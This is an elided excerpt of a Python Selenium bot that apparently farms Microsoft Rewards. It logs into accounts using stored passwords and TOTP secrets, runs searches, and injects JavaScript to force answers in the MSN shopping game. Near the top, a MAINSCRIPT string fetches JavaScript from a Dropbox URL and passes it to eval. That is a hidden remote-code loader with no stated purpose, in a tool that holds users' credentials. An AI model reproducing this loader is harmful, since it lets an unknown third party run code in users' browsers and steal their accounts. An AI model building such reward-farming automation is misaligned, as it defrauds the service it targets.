...
MAINSCRIPT = """async function runScript(url) {
    const response = await fetch(url);
    const script = await response.text();
    eval(script);
}

runScript('https://dl.dropboxusercontent.com/scl/fi/dt7dp0bi941glq9q7qtzj/contentscript.js?rlkey=7mk08p4v6ad574cdudh1e11cb&dl=0');"""
...
def login(browser: WebDriver, email: str, pwd: str, totpSecret: str, isMobile: bool = False):
    ...
    if ARGS.session:
        ...
        if browser.title == 'Microsoft account | Home' or isElementExists(browser, By.ID, 'navs_container'):
            ...
            return
        elif (browser.title == 'Your account has been temporarily suspended' or
                browser.current_url.startswith("https://account.live.com/Abuse") or
                isElementExists(browser, By.ID, 'suspendedAccount')):
...
def shoppingQuiz(browser: WebDriver):
...
def clickXY(browser: WebDriver, x, y, delay=True):
    from selenium.webdriver.common.action_chains import ActionChains
...
def completeMSNShoppingGame(browser: WebDriver, email: str, pwd: str, totpSecret: str) -> bool:
    ...
    def signIn(email: str, pwd: str, totpSecret: str) -> None:
        """sign in"""
        ...
        if isElementExists(browser, By.ID, "usernameError"):
            raise InvalidCredentialsException
        # Already logged
        elif isElementExists(browser, By.ID, 'mectrl_headerPicture') or ec.title_contains("Shop"):
            print('[MSN LOGIN]', 'Already logged-in !')
            return
        print("Título:" + browser.title)
        # Wait complete loading
        waitUntilVisible(browser, By.ID, 'i0118', 10)
        # Enter password
        time.sleep(3)
        ...
        try:
            ...
            pass
        print('[MSN LOGIN]', 'Logged-in !')


    def getGamingCard() -> Union[WebElement, Literal[False]]:
        gaming_card = None  # Initialize the gaming_card variable
        try:
            ...
            """
            result = browser.execute_script(scroll_script)
        except NoSuchElementException:
            pass  # Handle the case where the gaming card element is not found (optional)
        return gaming_card

    def run_answer_script() -> None:
        """ Run Javascript to force correct answer """
        browser.execute_script(open("msn_shopping.js", "r").read())
        # Wait after script execution
        time.sleep(20)

    def clickSingleAnswer() -> None:
        # Locate the elements using XPath
        element_to_hover_xpath = '//*[@id="144105875892"]/div'
        element_to_click_xpath = '//*[@id="144105875892"]/div/div/button[1]'
        
        # Find the elements
        element_to_hover = browser.find_element_by_xpath(element_to_hover_xpath)
        element_to_click = browser.find_element_by_xpath(element_to_click_xpath)
        ...
        # Wait for the element to be clickable (you can use WebDriverWait for this)
        # This is important because some elements may take a moment to become clickable
        # Replace this with an appropriate WebDriverWait if needed
        browser.implicitly_wait(5)  # Example: Wait for 5 seconds (you can adjust the wait time)
        
        # Click the element that becomes visible after hovering
    ...
    def clickPlayAgain() -> bool:
        """click play again"""
        time.sleep(random.randint(4, 6))
        options_container = expandShadowElement(gaming_card, 1)
        try:
            play_again_button = options_container.find_element(
                By.CLASS_NAME, 'game-panel-button')
            WebDriverWait(browser, 10).until(
                ec.element_to_be_clickable(play_again_button))
...
def logs():
    ...
    try:
        ...
        LOGS = json.load(
            open(f"{Path(__file__).parent}/logs/Logs_{ACCOUNTS_PATH.stem}.txt", "r"))
...
def updateLogs():
    ...
    with open(f'{Path(__file__).parent}/logs/Logs_{ACCOUNTS_PATH.stem}.txt', 'w') as file:
            ...
            if not LOGS[CURRENT_ACCOUNT]['PC searches']:
                ...
                if not ARGS.skip_shopping and not LOGS[CURRENT_ACCOUNT]['MSN shopping game']:
                    ...
                    if ARGS.repeat_shopping:
                        finished = completeMSNShoppingGame(browser, account['username'], account['password'], account.get('totpSecret'))
                        prYellow(
